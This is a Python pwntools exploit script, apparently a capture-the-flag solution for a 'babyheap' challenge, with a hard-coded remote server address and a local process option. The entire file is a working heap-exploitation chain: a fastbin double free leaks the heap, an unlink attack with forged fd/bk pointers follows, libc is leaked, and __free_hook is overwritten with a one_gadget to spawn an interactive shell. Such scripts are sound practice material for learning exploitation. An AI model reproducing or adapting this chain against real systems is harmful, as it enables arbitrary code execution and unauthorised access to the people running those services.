from pwn import *
from ctypes import *
import os
#import roputils as rop

remote_addr = "116.62.152.176"
remote_port = 20001

local_addr = "127.0.0.1"
local_port = 1807

pc = "./babyheap"
pwn_elf = ELF(pc)
pwn_rop = rop.ROP(pc)

uselibc = 2 #0 for no,1 for i386,2 for x64
local = 1
haslibc = 1
atta = 0

if uselibc == 2:
	context.arch = "amd64"
else:
	context.arch = "i386"

if uselibc ==2 and haslibc == 0:
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	if uselibc == 1 and haslibc == 0:
		libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else:
		libc = ELF('./libc.so.6')

if local == 1:
	if haslibc:
		p = process(pc,env={'LD_PRELOAD':'./libc.so.6'})
	else:
		p = process(pc)
elif local == 0:
	p = remote(remote_addr,remote_port)
	if haslibc:
		libc = ELF('./libc.so.6')
else:
	p = remote(local_addr,local_port)
	if haslibc:
		libc = ELF('./libc.so.6')

context.log_level = True

if local:
	if atta:
		gdb.attach(p,'b *0x400c86\n b *0x400bd9')


def sla(a,b):
	p.sendlineafter(a,b)

def sa(a,b):
	p.sendafter(a,b)

def ru(a):
	p.recvuntil(a)

def rv(a):
	return p.recv(a)


def lg(s,addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def alloc(idx,content):
	sla('Choice:','1')
	sla('Index:',str(idx))
	sla('Content:',content)

def show(idx):
	sla('Choice:','3')
	sla('Index:',str(idx))

def edit(idx,content):
	sla('Choice:','2')
	sla('Index:',str(idx))
	sa('Content:',content)


def delete(idx):
	sla('Choice:','4')
	sla('Index:',str(idx))

def hack():
	raw_input()
	bss_list = 0x602060
	alloc(3,'a')
	alloc(4,'b')
	alloc(5,'c')
	alloc(6,'d')
	alloc(7,'e')

	delete(3)
	delete(4)
	delete(3)
	show(3)
	heap_base = u64(rv(3).ljust(8,'\x00')) - 0x30
	lg('heap_base',heap_base)

	payload = p64(heap_base + 0x10)
	#edit(0,payload)
	alloc(0,payload)
	alloc(1,'g')
	alloc(2,p64(0) + p64(0x31))
	
	fake_fd = bss_list + 0x18 - 0x18
	fake_bk = bss_list + 0x18 - 0x10
	payload = p64(fake_fd) + p64(fake_bk) + p64(0x20) + '\x90' + '\x00'*6
	alloc(8,payload)
	edit(0,p64(0) + '\x21' + '\x00'*6 + '\n')

	delete(4)
	show(8)
	libc.address = u64(rv(6).ljust(8,'\x00')) - libc.symbols['__malloc_hook'] - 0x58 - 0x10
	lg('libc',libc.address)
	malloc_hook = libc.symbols['__malloc_hook']
	lg('malloc_hook',malloc_hook)
	free_hook = libc.symbols['__free_hook']
	lg('free_hook',free_hook)
	
	edit(3,p64(0)*3 + p64(free_hook))
	one_gadget = libc.address + 0x4526a
	lg('one_gadget',one_gadget)
	edit(3,p64(one_gadget) + '\n')
	#delete(1)
	
	sla('Choice:','4')
	sla('Index:','3')
	p.interactive()
hack()